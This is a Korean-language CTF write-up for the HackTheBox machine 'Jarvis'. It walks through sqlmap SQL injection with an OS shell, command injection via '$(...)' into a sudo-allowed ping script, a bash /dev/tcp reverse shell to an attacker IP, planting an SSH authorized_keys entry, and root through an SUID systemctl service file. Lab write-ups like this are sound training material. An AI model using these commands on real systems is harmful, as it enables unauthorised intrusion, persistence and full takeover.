# Jarvis - HackTheBox
## Recon
```bash
sudo nmap -p 22,80,64999 -sC -sV -vv -oA jarvis 10.129.229.137
```
<img width="1083" height="576" alt="image" src="https://github.com/user-attachments/assets/2ec2164b-5c64-443d-a77f-daa8bf4b9ab2" />

<br>
<br>

- SSH(22)
- HTTP(80)
- HTTP(64999)

---
## HTTP(80)
### banner grabbing
<img width="1083" height="383" alt="image" src="https://github.com/user-attachments/assets/e6bad445-db64-422b-b647-b19f94e74418" />

### SQL Injection
- `Rooms`탭에서 `Book Now`를 클릭하면 `cod`파라미터의 숫자에 따라서 화면이 달라짐.
<img width="455" height="36" alt="image" src="https://github.com/user-attachments/assets/8ebdea07-033d-4a13-9576-58b2101077de" />

<br>
<br>

- 기본 인젝션을 시도해보았으나 실패.
- `cod=1`의 화면과 `cod=2-1`의 화면이 같음.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/d530dd0a-c27f-4a7e-8abf-b2d2160dd534" />

<br>
<br>

- `SQL`에서 해당 쿼리가 실행되고 있다 판단하여 `sqlmap`을 실행.
- `SQL Injection` 성공.
- `WAF`에 의해서 거부당하는 경우가 있어 `--random-agent` 옵션을 붙여 실행.
```bash
sqlmap -u 'http://10.129.229.137/room.php?cod=1' -p cod --batch --random-agent
```
<img width="1084" height="375" alt="image" src="https://github.com/user-attachments/assets/b9d1a095-fba7-4443-9807-cef9cc5b5cb0" />

<br>
<br>

- 명령어 실행 성공.
```bash
sqlmap -u 'http://10.129.229.137/room.php?cod=1' -p cod --batch --random-agent --os-shell
```
<img width="1084" height="72" alt="image" src="https://github.com/user-attachments/assets/277e98be-c67b-41d2-af1d-01e86f0f3f52" />

<br>
<br>

- 리버스 셸 실행.
<img width="1084" height="72" alt="image" src="https://github.com/user-attachments/assets/9e478bfa-ce08-49a4-b049-f5bb5f8c1c70" />

<br>
<br>

- 셸 획득.
<img width="1084" height="135" alt="image" src="https://github.com/user-attachments/assets/97cffab7-0e38-41c2-8f57-501c380c57ee" />

---
## Shell as pepper
- `/var/www/Admin-Utilities/simpler.py` 스크립트를 `pepper`유저로 실행 가능.
<img width="1084" height="135" alt="image" src="https://github.com/user-attachments/assets/0331a126-5eec-4765-a0a6-5fb2ed609eed" />

<br>
<br>

- 스크립트에서 `ping`커맨드를 실행시키는 코드 발견.
- 다른 명령어가 실행되지 못하도록 문자들을 제한하였으나 `$`는 제한하지 않음.
<img width="1084" height="183" alt="image" src="https://github.com/user-attachments/assets/65a92a90-52f7-4625-a03d-a49e40f7c64d" />

<br>
<br>

- 로컬에 서버를 생성하여 로컬로 요청이 오는지 확인.
```
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p

Enter an IP: 10.10.10.$(curl http://10.10.14.23:443)
```
<img width="1084" height="375" alt="image" src="https://github.com/user-attachments/assets/cd87a702-c7b8-4667-be7d-91a366e83b68" />

<br>
<br>

<img width="1084" height="93" alt="image" src="https://github.com/user-attachments/assets/a8f3c12e-f20e-4c92-a46f-b80b3a0291f6" />

<br>
<br>

- `ex.sh` 생성.
```bash
echo '#!/bin/bash' > ex.sh

echo 'bash -c "bash -i >&/dev/tcp/10.10.14.23/443 0>&1"' >> ex.sh

chmod 777 ex.sh
```
<img width="1084" height="70" alt="image" src="https://github.com/user-attachments/assets/5a1261be-d79e-4627-8dc2-2c2c90d3aba5" />

<br>
<br>

- 리버스 셸 실행.
```
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p

Enter an IP: $(/tmp/ex.sh)
```
<img width="1084" height="290" alt="image" src="https://github.com/user-attachments/assets/981f193f-1364-435d-bf2e-cacf0b5d6b82" />

<br>
<br>

- 셸 획득.
<img width="1084" height="159" alt="image" src="https://github.com/user-attachments/assets/fbd1fa1b-2f57-4aa5-bb2a-c40c4d338f42" />

<br>
<br>

- `SSH`키 생성.
```bash
ssh-keygen -t ed25519
```
<img width="1084" height="488" alt="image" src="https://github.com/user-attachments/assets/99c725cf-169d-4259-be77-01186b85dbb1" />

<br>
<br>

- 로컬의 공개키를 등록.
```bash
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHC9CSquvgrfSRsocPt1slVCFLgaF0c3Tfcp8FXLBCHr kali@kali' > authorized_keys
```
<img width="1084" height="49" alt="image" src="https://github.com/user-attachments/assets/6c9e2293-8e50-4b3b-888f-53609a61dc94" />

<br>
<br>

- `SSH` 접속.
```bash
ssh pepper@10.129.229.137
```
<img width="1084" height="466" alt="image" src="https://github.com/user-attachments/assets/0e715782-b065-4d2d-b496-8b643c2439f1" />

---
## Privesc
- `systemctl`에 SUID가 설정되어 있음.
```bash
find / -perm -4000 2>/dev/null
```
<img width="1084" height="157" alt="image" src="https://github.com/user-attachments/assets/21e764cf-e952-41a9-9b96-5d0b37dffe09" />

<br>
<br>

- https://gtfobins.org/gtfobins/systemctl/
- `ex.sh`를 생성해준 뒤 `ex.service` 생성.
```bash
echo '#!/bin/bash' > ex.sh

echo 'bash -c "bash -i >&/dev/tcp/10.10.14.23/443 0>&1"' >> ex.sh

chmod 777 ex.sh

echo '[Service]
Type=oneshot
ExecStart=/tmp/ex.sh
[Install]
WantedBy=multi-user.target' > ex.service
```
<img width="1084" height="177" alt="image" src="https://github.com/user-attachments/assets/a5be9b2f-e28b-4473-b208-3fbc9877936d" />

<br>
<br>

- 리버스 셸 실행.
```bash
systemctl link /tmp/ex.service

systemctl enable --now /tmp/ex.service
```
<img width="1084" height="94" alt="image" src="https://github.com/user-attachments/assets/16d5ddda-6eee-440a-a57f-55cea5ff67e5" />

<br>
<br>

- 셸 획득.
<img width="1084" height="204" alt="image" src="https://github.com/user-attachments/assets/30825e1a-4af6-4b7b-826a-ae722b8f0b04" />

---
## FLAG
- `/home/pepper/user.txt`
<img width="1084" height="285" alt="image" src="https://github.com/user-attachments/assets/e9c0ca45-1adc-456b-99d5-92a2ac25dd82" />

<br>
<br>

- `/root/root.txt`
<img width="1084" height="375" alt="image" src="https://github.com/user-attachments/assets/bb8821e1-2ac7-40f3-ab70-e635bc867043" />
